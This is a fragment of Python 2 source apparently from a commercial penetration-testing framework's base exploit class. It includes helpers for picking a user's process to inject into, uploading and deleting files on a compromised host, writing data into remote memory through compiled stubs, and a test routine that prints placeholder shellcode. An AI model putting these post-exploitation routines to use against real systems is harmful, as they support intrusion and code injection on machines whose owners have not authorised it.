            return 0

        return 1


    def get_process_owned_by(self, node, user, exe=None):
        """
        CURRENTLY WIN32 ONLY

        Returns False on failure.

        For the specified user find a process they own so as we can inject into it,
        if an exe name is specified then find an instance of that exe they own, if one isnt
        return the first process we find that they own.
        (Originally for use with the AddressBookInfo stuff)
        Returns:
                None - if process owned by user could not be found
                dictionary of process info if it could
        """
        if "win32api" not in node.capabilities:
            self.log("Cannot run get_process_owned_by on this node, sorry")
            return False
        ##First get a list of all the processes
        p_dict=node.shell.processlist()

        ##For each process we need to find its owner, if it is owned by our desired user stop and return, else continue looking
        self.log("Looking for process owned by %s"%(user))
        if exe:
            self.log("Name of target process %s"%(exe))
        for proc in p_dict:
            if self.state==self.HALT:
                return False
            p_owner=node.shell.get_owner_of_process(proc["pid"])
            p_owner=''.join(p_owner)
            if p_owner.lower() == user.lower():

                if exe and proc["exe"] != exe:
                    self.log("Correct owner: %s wrong process: %s, continuing to look"%(user, proc['exe']))
                    continue

                self.log("FOUND! process owned by %s"%(user) )
                self.log("PID:%s pName:%s"%(proc["pid"],proc["exe"]))
                return proc
            else:
                self.log("%s owned by %s, continuing"%(proc["pid"], p_owner))

        return False

    def new_event(self, name, data):
        """Creates a new report event."""
        if self.engine:
            self.engine.new_event(name, data, self.module_name)
        else:
            devlog('reports', 'no engine instance to report for')

    def nodeUpload(self, src, dst):
        try:
            self.node.shell.upload(src, destfilename = dst)
        except NodeCommandError, ex:
            self.log('[EE] Failed to upload %s to %s (%s)' % (src, dst, ex))
            return False

        self.log('[+] Upload succeeded')
        return True

    def nodeDeleteFile(self, remote_path):
        try:
            ret = self.node.shell.unlink(remote_path)
        except Exception, ex:
            self.log('[EE] Error while removing %s (%s)' % (remote_path, ex))
            return False

        self.log('[+] Removed correctly (%s)' % remote_path)
        return True

    def is_windows_node(self):
        if "win32api" in self.node.capabilities:
            return True

        self.log("[EE] Not a Windows node")
        return False

    def is_linux_node(self):
        if "linux" in self.node.capabilities:
            return True

        self.log("[EE] Not a Linux node")
        return False

    def is_osx_node(self):
        if "osx" in self.node.capabilities:
            return True

        self.log("[EE] Not an OS X node")
        return False

    def memcpy(self, dest, data):
        lvars = {}
        lvars["dest"] = dest

        code = """
        #import "local", "readintfromself"  as "readintfromself"
        #import "local", "readdatafromself" as "readdatafromself"

        #import "int",   "dest"             as "dest"

        void main()
        {
            int size;

            size = readintfromself();
            readdatafromself(dest, size);
        }
        """
        self.node.shell.clearfunctioncache()
        request = self.node.shell.compile(code, lvars)
        self.node.shell.sendrequest(request)

        self.node.shell.sendint(len(data))
        self.node.shell.writebuf(data)

        self.node.shell.leave()


def main():
    mysploit=canvasexploit()
    mysploit.badstring="\x00\r\n\x2c\x2f"
    mysploit.shellcode="D"*300
    #mysploit.easychunk(64,16,0)
    mysploit.createTestShellcode()
    #print prettyhexprint(mysploit.shellcode[60:])
    print "%s"%(prettyprint(mysploit.shellcode))

if __name__=="__main__":
    main()
